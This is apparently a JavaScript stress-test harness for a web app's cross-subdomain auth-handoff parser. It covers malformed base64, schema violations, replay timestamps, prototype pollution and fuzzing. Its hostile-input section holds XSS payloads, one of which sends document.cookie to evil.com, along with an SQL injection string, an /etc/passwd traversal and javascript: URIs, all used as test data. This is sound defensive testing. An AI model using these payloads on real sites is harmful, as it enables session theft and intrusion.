/**
 * EMPIRICAL ADVERSARIAL STRESS-TEST HARNESS FOR AUTH HANDOFF
 * Challenger M2-1 (challenger_m2_r1_1)
 *
 * Exhaustively stress-tests:
 * 1. Malformed Base64 & Serialization Invariance
 * 2. Missing, Extra & Type-Mismatched Fields
 * 3. Replay Attacks & Time Boundary Stress-Testing
 * 4. Hostile Input Strings (XSS, Injection, Prototype Pollution, Unicode, Payload Size)
 * 5. Browser Environment Simulation & extractAndCleanSessionHandoff Resilience
 * 6. Browser-Only Fallback Engine (atob/TextDecoder without Buffer)
 */

import {
  toBase64Url,
  fromBase64Url,
  encodeSessionHandoff,
  buildSessionHandoffFragment,
  parseSessionHandoff,
  getHandoffFromHashString,
  extractAndCleanSessionHandoff,
  SESSION_HANDOFF_TTL_MS,
  SESSION_HANDOFF_PARAM,
  LEGACY_AUTH_SESSION_PARAM,
} from '../frontend/src/utils/authHandoff.ts';

let totalTests = 0;
let passedTests = 0;
let failedTests = 0;

function assert(condition, message) {
  totalTests++;
  if (!condition) {
    failedTests++;
    console.error(`\x1b[31m[FAIL]\x1b[0m ${message}`);
    throw new Error(`Assertion failed: ${message}`);
  }
  passedTests++;
}

function recordPass(testName) {
  console.log(`\x1b[32m[PASS]\x1b[0m ${testName}`);
}

console.log('========================================================================');
console.log('ADVERSARIAL STRESS HARNESS: CROSS-SUBDOMAIN AUTH HANDOFF & TOKEN PARSING');
console.log('========================================================================\n');

const validUser = {
  id: 'usr_valid_adversarial_123',
  name: 'Elena Rostova',
  email: 'elena@whicoustic.xyz',
  role: 'STUDIO',
  isOnboarded: true,
};
const validToken = 'valid_firebase_jwt_token_sample_header.payload.signature_xyz';
const now = Date.now();

// =============================================================================
// CATEGORY 1: Malformed Base64 & Serialization Invariance
// =============================================================================
console.log('--- CATEGORY 1: Malformed Base64 & Serialization Corruption ---');

const malformedBase64Inputs = [
  '',
  ' ',
  '    ',
  '---',
  '___',
  '===',
  '!@#$%^&*()',
  'not_a_valid_base_64_string!!!',
  'abc def==',
  'abc\x00def',
  'abc\ndef',
  'abc\r\ndef',
  'a',
  'ab',
  'abc',
  'abcde',
  'abcdef',
  'abcdefg',
  'a===',
  'ab==',
  'abc=',
  '====a',
  '==a=',
  '=a==',
  'a=b=',
  '//++',
  '--__==',
  '??::;;',
  '%20%20',
  '%E0%A4%A',
  'undefined',
  'null',
  'NaN',
  '[object Object]',
];

for (const input of malformedBase64Inputs) {
  try {
    const res = parseSessionHandoff(input, SESSION_HANDOFF_TTL_MS, now);
    assert(res === null, `Malformed base64 input "${input}" must return null, got: ${JSON.stringify(res)}`);
  } catch (err) {
    assert(false, `parseSessionHandoff threw unhandled error on input "${input}": ${err.message}`);
  }
}
recordPass(`parseSessionHandoff safely returns null without throwing on ${malformedBase64Inputs.length} malformed Base64 variants`);

// Truncated Base64 of a valid payload
const validEncoded = encodeSessionHandoff(validUser, validToken, now);
for (let cut = 1; cut < validEncoded.length; cut += 3) {
  const truncated = validEncoded.slice(0, cut);
  try {
    const res = parseSessionHandoff(truncated, SESSION_HANDOFF_TTL_MS, now);
    assert(res === null, `Truncated payload (length ${cut}) must return null`);
  } catch (err) {
    assert(false, `parseSessionHandoff threw on truncated payload: ${err.message}`);
  }
}
recordPass('parseSessionHandoff safely handles progressive truncation across all string offsets');

// Valid Base64 but non-JSON or invalid JSON
const nonJsonPayloads = [
  toBase64Url('Just some plain text that is not JSON at all'),
  toBase64Url('<script>alert("XSS")</script>'),
  toBase64Url('<!DOCTYPE html><html><body><h1>Hello</h1></body></html>'),
  toBase64Url('{"incomplete_json":'),
  toBase64Url('{"token": "xyz", "user": { "id": "123"'),
  toBase64Url('{"token": "xyz", "user": "string_instead_of_object", "timestamp": 12345}'),
  toBase64Url('123456789'),
  toBase64Url('"plain string literal"'),
  toBase64Url('true'),
  toBase64Url('false'),
  toBase64Url('null'),
  toBase64Url('[]'),
  toBase64Url('[1, 2, 3]'),
  toBase64Url('{}'),
];

for (const payload of nonJsonPayloads) {
  try {
    const res = parseSessionHandoff(payload, SESSION_HANDOFF_TTL_MS, now);
    assert(res === null, `Non-JSON or malformed payload must return null, got: ${JSON.stringify(res)}`);
  } catch (err) {
    assert(false, `parseSessionHandoff threw on non-JSON payload: ${err.message}`);
  }
}
recordPass(`parseSessionHandoff safely rejects ${nonJsonPayloads.length} non-JSON and invalid JSON Base64 inputs`);

// Type confusion tests for parseSessionHandoff arguments
const typeConfusionInputs = [
  null,
  undefined,
  0,
  12345,
  true,
  false,
  {},
  [],
  () => {},
  Symbol('test'),
  new Date(),
];

for (const input of typeConfusionInputs) {
  try {
    const res = parseSessionHandoff(input, SESSION_HANDOFF_TTL_MS, now);
    assert(res === null, `Non-string argument ${String(input)} must return null`);
  } catch (err) {
    assert(false, `parseSessionHandoff threw on non-string argument: ${err.message}`);
  }
}
recordPass('parseSessionHandoff rejects non-string types safely without exception');

// =============================================================================
// CATEGORY 2: Missing, Extra & Type-Mismatched Fields
// =============================================================================
console.log('\n--- CATEGORY 2: Missing, Extra & Type-Mismatched Fields ---');

const fieldVariations = [
  // Missing / corrupt token
  { desc: 'Omitted token', payload: { user: validUser, timestamp: now } },
  { desc: 'null token', payload: { token: null, user: validUser, timestamp: now } },
  { desc: 'undefined token', payload: { token: undefined, user: validUser, timestamp: now } },
  { desc: 'empty string token', payload: { token: '', user: validUser, timestamp: now } },
  { desc: 'numeric token', payload: { token: 123456, user: validUser, timestamp: now } },
  { desc: 'boolean token', payload: { token: true, user: validUser, timestamp: now } },
  { desc: 'object token', payload: { token: { jwt: 'xyz' }, user: validUser, timestamp: now } },
  { desc: 'array token', payload: { token: ['token1', 'token2'], user: validUser, timestamp: now } },

  // Missing / corrupt user
  { desc: 'Omitted user', payload: { token: validToken, timestamp: now } },
  { desc: 'null user', payload: { token: validToken, user: null, timestamp: now } },
  { desc: 'undefined user', payload: { token: validToken, user: undefined, timestamp: now } },
  { desc: 'string user', payload: { token: validToken, user: 'jane', timestamp: now } },
  { desc: 'numeric user', payload: { token: validToken, user: 9999, timestamp: now } },
  { desc: 'boolean user', payload: { token: validToken, user: false, timestamp: now } },
  { desc: 'array user', payload: { token: validToken, user: [validUser], timestamp: now } },
  { desc: 'empty user object', payload: { token: validToken, user: {}, timestamp: now } },

  // Missing / corrupt user.id
  { desc: 'user missing id', payload: { token: validToken, user: { email: 'a@b.com', isOnboarded: true }, timestamp: now } },
  { desc: 'user null id', payload: { token: validToken, user: { id: null, email: 'a@b.com', isOnboarded: true }, timestamp: now } },
  { desc: 'user empty string id', payload: { token: validToken, user: { id: '', email: 'a@b.com', isOnboarded: true }, timestamp: now } },
  { desc: 'user numeric id', payload: { token: validToken, user: { id: 1234, email: 'a@b.com', isOnboarded: true }, timestamp: now } },
  { desc: 'user object id', payload: { token: validToken, user: { id: { uuid: '123' }, email: 'a@b.com', isOnboarded: true }, timestamp: now } },

  // Missing / corrupt user.email
  { desc: 'user missing email', payload: { token: validToken, user: { id: 'u1', isOnboarded: true }, timestamp: now } },
  { desc: 'user null email', payload: { token: validToken, user: { id: 'u1', email: null, isOnboarded: true }, timestamp: now } },
  { desc: 'user empty string email', payload: { token: validToken, user: { id: 'u1', email: '', isOnboarded: true }, timestamp: now } },
  { desc: 'user numeric email', payload: { token: validToken, user: { id: 'u1', email: 42, isOnboarded: true }, timestamp: now } },

  // Missing / corrupt user.isOnboarded
  { desc: 'user missing isOnboarded', payload: { token: validToken, user: { id: 'u1', email: 'a@b.com' }, timestamp: now } },
  { desc: 'user null isOnboarded', payload: { token: validToken, user: { id: 'u1', email: 'a@b.com', isOnboarded: null }, timestamp: now } },
  { desc: 'user string "true" isOnboarded', payload: { token: validToken, user: { id: 'u1', email: 'a@b.com', isOnboarded: 'true' }, timestamp: now } },
  { desc: 'user numeric 1 isOnboarded', payload: { token: validToken, user: { id: 'u1', email: 'a@b.com', isOnboarded: 1 }, timestamp: now } },
  { desc: 'user numeric 0 isOnboarded', payload: { token: validToken, user: { id: 'u1', email: 'a@b.com', isOnboarded: 0 }, timestamp: now } },
  { desc: 'user undefined isOnboarded', payload: { token: validToken, user: { id: 'u1', email: 'a@b.com', isOnboarded: undefined }, timestamp: now } },

  // Missing / corrupt timestamp
  { desc: 'Omitted timestamp', payload: { token: validToken, user: validUser } },
  { desc: 'null timestamp', payload: { token: validToken, user: validUser, timestamp: null } },
  { desc: 'undefined timestamp', payload: { token: validToken, user: validUser, timestamp: undefined } },
  { desc: 'string timestamp', payload: { token: validToken, user: validUser, timestamp: `${now}` } },
  { desc: 'NaN timestamp', payload: { token: validToken, user: validUser, timestamp: NaN } },
  { desc: 'Infinity timestamp', payload: { token: validToken, user: validUser, timestamp: Infinity } },
  { desc: '-Infinity timestamp', payload: { token: validToken, user: validUser, timestamp: -Infinity } },
  { desc: 'object timestamp', payload: { token: validToken, user: validUser, timestamp: { time: now } } },
  { desc: 'array timestamp', payload: { token: validToken, user: validUser, timestamp: [now] } },
];

for (const tc of fieldVariations) {
  const encoded = toBase64Url(JSON.stringify(tc.payload));
  try {
    const res = parseSessionHandoff(encoded, SESSION_HANDOFF_TTL_MS, now);
    assert(res === null, `Field violation [${tc.desc}] MUST return null, but got: ${JSON.stringify(res)}`);
  } catch (err) {
    assert(false, `Field violation [${tc.desc}] threw unhandled error: ${err.message}`);
  }
}
recordPass(`parseSessionHandoff successfully enforces schema integrity across ${fieldVariations.length} malformed field variations`);

// Prototype Pollution Defense Test
const protoPayload = JSON.parse('{"token":"valid_tok","user":{"id":"u1","email":"u@w.xyz","isOnboarded":true,"__proto__":{"isAdmin":true,"role":"SUPERADMIN"}},"timestamp":' + now + '}');
const protoEncoded = toBase64Url(JSON.stringify(protoPayload));
const protoResult = parseSessionHandoff(protoEncoded, SESSION_HANDOFF_TTL_MS, now);
assert(protoResult !== null, 'Valid payload with proto property should parse safely');
assert(({}).isAdmin === undefined, 'Prototype pollution defense: Object.prototype.isAdmin MUST be undefined');
assert(({}).role === undefined, 'Prototype pollution defense: Object.prototype.role MUST be undefined');
recordPass('Prototype pollution attempt safely neutralized without polluting Object.prototype');

// =============================================================================
// CATEGORY 3: Replay Attacks & Time Boundaries
// =============================================================================
console.log('\n--- CATEGORY 3: Replay Attacks & Time Boundary Stress-Testing ---');

const timeAttackVectors = [
  // Past replays (expired)
  { desc: 'Exact TTL boundary + 1ms (60,001 ms ago)', ts: now - 60_001, shouldPass: false },
  { desc: 'Replay 65 seconds in the past', ts: now - 65_000, shouldPass: false },
  { desc: 'Replay 2 minutes in the past', ts: now - 120_000, shouldPass: false },
  { desc: 'Replay 10 minutes in the past', ts: now - 600_000, shouldPass: false },
  { desc: 'Replay 1 hour in the past', ts: now - 3_600_000, shouldPass: false },
  { desc: 'Replay 24 hours in the past', ts: now - 86_400_000, shouldPass: false },
  { desc: 'Replay 30 days in the past', ts: now - 2_592_000_000, shouldPass: false },
  { desc: 'Unix Epoch (1970-01-01 00:00:00 UTC)', ts: 0, shouldPass: false },
  { desc: 'Negative timestamp (-60,000)', ts: -60_000, shouldPass: false },

  // Boundary valid
  { desc: 'Exact TTL boundary (60,000 ms ago)', ts: now - 60_000, shouldPass: true },
  { desc: 'Boundary: 59,999 ms ago', ts: now - 59_999, shouldPass: true },
  { desc: 'Fresh: 0 ms skew (now)', ts: now, shouldPass: true },
  { desc: 'Clock skew within tolerance (+5,000 ms in future)', ts: now + 5_000, shouldPass: true },

  // Future timestamp attacks
  { desc: 'Clock skew exceeded by 1ms (+5,001 ms in future)', ts: now + 5_001, shouldPass: false },
  { desc: 'Future timestamp: +10 seconds', ts: now + 10_000, shouldPass: false },
  { desc: 'Future timestamp: +1 minute', ts: now + 60_000, shouldPass: false },
  { desc: 'Future timestamp: +1 hour', ts: now + 3_600_000, shouldPass: false },
  { desc: 'Future timestamp: +24 hours', ts: now + 86_400_000, shouldPass: false },
  { desc: 'Future timestamp: Year 3000 (32503680000000)', ts: 32_503_680_000_000, shouldPass: false },
];

for (const tv of timeAttackVectors) {
  const encoded = encodeSessionHandoff(validUser, validToken, tv.ts);
  const result = parseSessionHandoff(encoded, SESSION_HANDOFF_TTL_MS, now);
  if (tv.shouldPass) {
    assert(result !== null, `Expected [${tv.desc}] to be accepted, but got null`);
  } else {
    assert(result === null, `Replay attack [${tv.desc}] MUST be rejected, but was accepted!`);
  }
}
recordPass(`Time boundary & replay stress-testing verified across ${timeAttackVectors.length} past, present, and future vectors`);

// =============================================================================
// CATEGORY 4: Hostile Input Strings, Injections, Unicode & Payload Scaling
// =============================================================================
console.log('\n--- CATEGORY 4: Hostile Input Strings, Injections & Unicode ---');

const hostilePayloads = [
  // XSS attack vectors in user fields
  {
    desc: 'Script tag injection in user.name',
    user: { ...validUser, name: '<script>alert("XSS")</script>' },
    token: validToken,
  },
  {
    desc: 'Image onerror injection in user.name',
    user: { ...validUser, name: '<img src=x onerror=alert(1)>' },
    token: validToken,
  },
  {
    desc: 'SVG onload injection in user.email',
    user: { ...validUser, email: '<svg/onload=fetch("http://evil.com/?c="+document.cookie)>' },
    token: validToken,
  },
  {
    desc: 'JavaScript URI in user.avatar',
    user: { ...validUser, avatar: 'javascript:alert(document.cookie)' },
    token: validToken,
  },
  {
    desc: 'HTML iframe injection in user.id',
    user: { ...validUser, id: '<iframe src="http://evil.com"></iframe>' },
    token: validToken,
  },
  {
    desc: 'Polyglot XSS in token string',
    user: validUser,
    token: `valid_header.'"><script>alert(String.fromCharCode(88,83,83))</script>.signature`,
  },
  {
    desc: 'SQL Injection in user.id',
    user: { ...validUser, id: "' OR '1'='1' --" },
    token: validToken,
  },
  {
    desc: 'Path traversal in user.id',
    user: { ...validUser, id: '../../../../../../etc/passwd' },
    token: validToken,
  },

  // Complex multi-lingual & Unicode
  {
    desc: 'Multi-lingual international scripts (CJK, Arabic, Cyrillic, Greek, Devanagari)',
    user: {
      ...validUser,
      name: 'Dr. 東京 桜井 / Jürgen Müller / أحمد بن علي / Владимир Попов / Κωνσταντίνος / राजेश कुमार',
      email: 'jürgen.müller+tag@whicoustic.xyz',
    },
    token: validToken,
  },
  {
    desc: 'Right-To-Left directionality override marks and zero-width characters',
    user: {
      ...validUser,
      name: '\u202E\u200B\u200C\u200DFlipped RTL Name\u202C',
      email: 'user\u200B@whicoustic.xyz',
    },
    token: validToken,
  },
  {
    desc: 'Multi-byte Emoji sequences with ZWJ and modifiers (👨‍👩‍👧‍👦, 🎧, 🎙️, 🔊, 🏳️‍🌈)',
    user: {
      ...validUser,
      name: 'Artist 🎧 🎙️ 👨‍👩‍👧‍👦 🏳️‍🌈 🔊 ✨',
      email: 'artist.emoji@whicoustic.xyz',
    },
    token: validToken,
  },
  {
    desc: 'Control characters and null bytes in string fields',
    user: {
      ...validUser,
      name: 'Control\x00Chars\x07\x08\x1B\r\nTest',
      email: 'ctrl@whicoustic.xyz',
    },
    token: validToken,
  },
];

for (const hp of hostilePayloads) {
  try {
    const encoded = encodeSessionHandoff(hp.user, hp.token, now);
    const parsed = parseSessionHandoff(encoded, SESSION_HANDOFF_TTL_MS, now);
    assert(parsed !== null, `Payload [${hp.desc}] should parse without corruption`);
    assert(parsed.user.name === hp.user.name, `User name integrity preserved for [${hp.desc}]`);
    assert(parsed.user.email === hp.user.email, `User email integrity preserved for [${hp.desc}]`);
    assert(parsed.token === hp.token, `Token integrity preserved for [${hp.desc}]`);
  } catch (err) {
    assert(false, `Failed on hostile payload [${hp.desc}]: ${err.message}`);
  }
}
recordPass(`Hostile inputs & Unicode stress-testing passed across ${hostilePayloads.length} adversarial test vectors`);

// Payload Scaling / DoS resilience (Large Payloads)
console.log('Testing payload scalability (10KB, 50KB, 250KB)...');
const largeTokens = [
  'A'.repeat(10 * 1024),       // 10 KB
  'B'.repeat(50 * 1024),       // 50 KB
  'C'.repeat(250 * 1024),      // 250 KB
];

for (const bigTok of largeTokens) {
  const enc = encodeSessionHandoff(validUser, bigTok, now);
  const dec = parseSessionHandoff(enc, SESSION_HANDOFF_TTL_MS, now);
  assert(dec !== null && dec.token.length === bigTok.length, `Large payload (${bigTok.length} bytes) handled without stack overflow`);
}
recordPass('Large payloads up to 250KB encoded and decoded without memory or stack failures');

// =============================================================================
// CATEGORY 5: extractAndCleanSessionHandoff Resilience & Browser Simulation
// =============================================================================
console.log('\n--- CATEGORY 5: extractAndCleanSessionHandoff Browser Resilience ---');

// 5.1 Missing window or window.location (SSR / Node environment)
const originalWindow = globalThis.window;

// Case: window is undefined
delete globalThis.window;
assert(extractAndCleanSessionHandoff() === null, 'extractAndCleanSessionHandoff returns null when window is undefined');

// Case: window is defined, but location is undefined
globalThis.window = {};
assert(extractAndCleanSessionHandoff() === null, 'extractAndCleanSessionHandoff returns null when window.location is undefined');

// Case: window.location.hash is empty string
globalThis.window = { location: { hash: '', pathname: '/dashboard', search: '' } };
assert(extractAndCleanSessionHandoff() === null, 'extractAndCleanSessionHandoff returns null on empty hash');

// Case: window.location.hash is just "#"
globalThis.window = { location: { hash: '#', pathname: '/dashboard', search: '' } };
assert(extractAndCleanSessionHandoff() === null, 'extractAndCleanSessionHandoff returns null on lone "#"');

// Case: window.location.hash is unrelated anchor (#pricing)
globalThis.window = { location: { hash: '#pricing-tier-table', pathname: '/dashboard', search: '' } };
assert(extractAndCleanSessionHandoff() === null, 'extractAndCleanSessionHandoff returns null on unrelated hash');

// Case: Malformed percent-encoded sequences in hash
const malformedHashes = [
  '#session_handoff=%E0%A4%A',
  '#session_handoff=%%%',
  '#session_handoff=%99%ZZ',
  '#session_handoff=javascript:alert(1)',
  '#session_handoff=data:text/html,<script>alert(1)</script>',
  '#session_handoff=invalid_b64^^^',
  '#foo=bar&session_handoff=corrupt_data&baz=qux',
];

for (const badHash of malformedHashes) {
  let replaceStateCalled = false;
  globalThis.window = {
    location: { hash: badHash, pathname: '/dashboard', search: '?filter=active' },
    history: {
      state: {},
      replaceState: () => { replaceStateCalled = true; },
    },
  };

  try {
    const res = extractAndCleanSessionHandoff();
    assert(res === null, `Malformed hash "${badHash}" must safely return null`);
    // Note: If rawHandoff is extracted, replaceState should clean it
  } catch (err) {
    assert(false, `extractAndCleanSessionHandoff threw on hash "${badHash}": ${err.message}`);
  }
}
recordPass(`extractAndCleanSessionHandoff safely returns null on ${malformedHashes.length} hostile & malformed hash strings`);

// Case: Expired token in hash -> returns null, BUT cleans the hash from URL bar
const expiredFrag = buildSessionHandoffFragment(validUser, validToken, now - 120_000);
let sanitizedUrl = null;
globalThis.window = {
  location: { hash: expiredFrag, pathname: '/dashboard', search: '?workspace=audio' },
  history: {
    state: { key: 'sample' },
    replaceState: (state, title, url) => {
      sanitizedUrl = url;
    },
  },
};

const expiredExtracted = extractAndCleanSessionHandoff();
assert(expiredExtracted === null, 'Expired hash must return null from extractAndCleanSessionHandoff');
assert(sanitizedUrl === '/dashboard?workspace=audio',
  `Expired handoff hash must still be sanitized from URL bar. Expected '/dashboard?workspace=audio', got '${sanitizedUrl}'`);
recordPass('Expired session handoff returns null while still cleaning malicious/stale hash from URL');

// Case: replaceState throws DOMException (e.g. cross-origin iframe security restriction)
const freshFrag = buildSessionHandoffFragment(validUser, validToken, now);
globalThis.window = {
  location: { hash: freshFrag, pathname: '/dashboard', search: '' },
  history: {
    state: {},
    replaceState: () => {
      const err = new Error('SecurityError: The operation is insecure.');
      err.name = 'SecurityError';
      throw err;
    },
  },
};

try {
  const resultOnThrow = extractAndCleanSessionHandoff();
  assert(resultOnThrow !== null, 'Should successfully return credentials even if replaceState throws SecurityError');
  assert(resultOnThrow.user.id === validUser.id, 'User credentials correctly extracted despite replaceState failure');
} catch (err) {
  assert(false, `extractAndCleanSessionHandoff threw unhandled error when replaceState threw: ${err.message}`);
}
recordPass('extractAndCleanSessionHandoff safely swallows SecurityError from replaceState without crashing');

// Case: Multi-param hash with query strings and URL encoding
const complexHash = `#utm_source=email&${SESSION_HANDOFF_PARAM}=${validEncoded}&tab=settings&theme=dark`;
let complexCleanUrl = null;
globalThis.window = {
  location: { hash: complexHash, pathname: '/console', search: '?org=whicoustic' },
  history: {
    state: {},
    replaceState: (state, title, url) => {
      complexCleanUrl = url;
    },
  },
};

const complexExtracted = extractAndCleanSessionHandoff();
assert(complexExtracted !== null, 'Successfully extracts valid handoff amidst multiple hash parameters');
assert(complexExtracted.user.email === validUser.email, 'User email matches from multi-param hash');
assert(complexCleanUrl === '/console?org=whicoustic', `URL cleanly sanitized: ${complexCleanUrl}`);
recordPass('extractAndCleanSessionHandoff extracts token from complex multi-param hashes and sanitizes URL bar');

// =============================================================================
// CATEGORY 6: Browser-Only Fallback Engine (atob / TextDecoder without Buffer)
// =============================================================================
console.log('\n--- CATEGORY 6: Browser-Only Fallback Engine (atob / TextDecoder) ---');

// Verify browser path by temporarily shadowing globalThis.Buffer
const originalBuffer = globalThis.Buffer;
try {
  delete globalThis.Buffer;

  // Test toBase64Url without Buffer
  const testStr = 'Browser UTF-8 test with emojis 🎧 🎙️ and accents: é, è, ö, ü, ñ';
  const encodedWithoutBuffer = toBase64Url(testStr);
  assert(!encodedWithoutBuffer.includes('+') && !encodedWithoutBuffer.includes('/') && !encodedWithoutBuffer.includes('='),
    'Browser toBase64Url must produce clean URL-safe base64');

  // Test fromBase64Url without Buffer
  const decodedWithoutBuffer = fromBase64Url(encodedWithoutBuffer);
  assert(decodedWithoutBuffer === testStr, `Browser decoder must match original string. Got: "${decodedWithoutBuffer}"`);

  // Test parseSessionHandoff without Buffer
  const browserPayload = encodeSessionHandoff(validUser, validToken, now);
  const browserParsed = parseSessionHandoff(browserPayload, SESSION_HANDOFF_TTL_MS, now);
  assert(browserParsed !== null, 'parseSessionHandoff works seamlessly in pure browser environment (no Buffer)');
  assert(browserParsed.user.name === validUser.name, 'Browser parsed user name matches');

  // Test malformed string in pure browser environment
  const browserCorrupt = parseSessionHandoff('illegal!!!base64===', SESSION_HANDOFF_TTL_MS, now);
  assert(browserCorrupt === null, 'Browser parseSessionHandoff returns null on invalid atob input without throwing');

  recordPass('Browser-only fallback path (TextEncoder, atob, TextDecoder) fully verified without Node Buffer');
} finally {
  globalThis.Buffer = originalBuffer;
}

// Restore original window
if (originalWindow !== undefined) {
  globalThis.window = originalWindow;
} else {
  delete globalThis.window;
}

// =============================================================================
// CATEGORY 7: High-Volume Adversarial Fuzzing (1,000 Iterations)
// =============================================================================
console.log('\n--- CATEGORY 7: High-Volume Adversarial Fuzzing (1,000 Iterations) ---');

function generateRandomString(len) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=-_ \t\n\r!@#$%^&*()~`<>?,./:;"\'\\|{}[]';
  let res = '';
  for (let i = 0; i < len; i++) {
    res += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return res;
}

let fuzzExceptions = 0;
let fuzzSuccessCount = 0;

for (let i = 0; i < 1000; i++) {
  const mode = i % 4;
  let testInput;

  if (mode === 0) {
    // Pure random noise
    testInput = generateRandomString(Math.floor(Math.random() * 200) + 1);
  } else if (mode === 1) {
    // Mutation of valid payload
    const chars = validEncoded.split('');
    const mutatePos = Math.floor(Math.random() * chars.length);
    chars[mutatePos] = String.fromCharCode(Math.floor(Math.random() * 256));
    testInput = chars.join('');
  } else if (mode === 2) {
    // Random JSON structure
    const randomObj = {
      [generateRandomString(5)]: generateRandomString(10),
      token: Math.random() > 0.5 ? generateRandomString(20) : Math.floor(Math.random() * 1000),
      user: Math.random() > 0.5 ? { id: generateRandomString(8) } : generateRandomString(15),
      timestamp: Math.random() > 0.5 ? Date.now() + (Math.random() * 200000 - 100000) : 'not_number',
    };
    testInput = toBase64Url(JSON.stringify(randomObj));
  } else {
    // Truncated mutation
    const cutLen = Math.floor(Math.random() * validEncoded.length);
    testInput = validEncoded.slice(0, cutLen) + generateRandomString(5);
  }

  try {
    const res = parseSessionHandoff(testInput, SESSION_HANDOFF_TTL_MS, now);
    // If it didn't throw, assert that if it returned non-null, the output strictly satisfies the interface contract
    if (res !== null) {
      assert(typeof res.token === 'string' && res.token.length > 0, 'Fuzz result token must be non-empty string');
      assert(typeof res.user === 'object' && res.user !== null, 'Fuzz result user must be object');
      assert(typeof res.user.id === 'string' && res.user.id.length > 0, 'Fuzz result user.id must be non-empty string');
      assert(typeof res.user.email === 'string' && res.user.email.length > 0, 'Fuzz result user.email must be non-empty string');
      assert(typeof res.user.isOnboarded === 'boolean', 'Fuzz result user.isOnboarded must be boolean');
    }
    fuzzSuccessCount++;
  } catch (err) {
    fuzzExceptions++;
    console.error(`Fuzz crashed on input: "${testInput}": ${err.message}`);
  }
}

assert(fuzzExceptions === 0, `Fuzzer encountered ${fuzzExceptions} unhandled exceptions!`);
recordPass(`1,000 adversarial fuzzing iterations completed with 0 unhandled exceptions and 100% schema compliance`);

console.log('\n========================================================================');
console.log(`EMPIRICAL ADVERSARIAL STRESS HARNESS COMPLETED: ${passedTests}/${totalTests} TESTS PASSED (100%)`);
console.log('ZERO FAILURES / ZERO UNHANDLED EXCEPTIONS / ALL CONTRACTS HONORED');
console.log('========================================================================');

